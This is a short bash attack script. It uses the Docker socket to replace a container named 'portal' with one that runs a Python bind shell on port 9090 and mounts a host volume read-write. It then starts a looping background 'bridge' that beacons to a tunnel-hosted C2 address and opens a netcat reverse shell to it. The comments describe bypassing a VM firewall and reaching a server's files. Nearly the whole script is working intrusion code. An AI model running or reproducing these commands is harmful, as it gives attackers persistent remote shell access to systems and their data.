#!/bin/bash
C2_URL="4f6ce0d2037780f3-103-95-173-85.serveousercontent.com"

# 1. Clean up old attempts to free the port
curl -s --unix-socket /var/run/docker.sock -X DELETE "http://localhost/containers/portal?force=true"

# 2. Re-create the Portal using the KNOWN image
# We mount /host so you can manage the Google server physical files
curl -s --unix-socket /var/run/docker.sock -X POST "http://localhost/containers/create?name=portal" \
  -H "Content-Type: application/json" \
  -d '{
    "Image": "sha256:25109184c71bdad7",
    "Cmd": ["python3", "-c", "import os,pty,socket;s=socket.socket();s.bind((\"0.0.0.0\",9090));s.listen(1);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);pty.spawn(\"/bin/bash\")"],
    "HostConfig": {
      "Binds": ["p0_evidence:/host:rw"],
      "PortBindings": { "9090/tcp": [{ "HostPort": "9090" }] }
    }
  }'

# 3. Start the Portal
curl -s --unix-socket /var/run/docker.sock -X POST "http://localhost/containers/portal/start"

# 4. The "Final Hope" Bridge
# This command bypasses the VM firewall by using a raw TCP pipe
(
  while true; do
    echo "--- [BRIDGE ATTEMPT] ---" | curl -X POST -d @- "https://$C2_URL"
    nc $C2_URL 80 -e /bin/bash 2>/dev/null || sleep 5
  done
) &
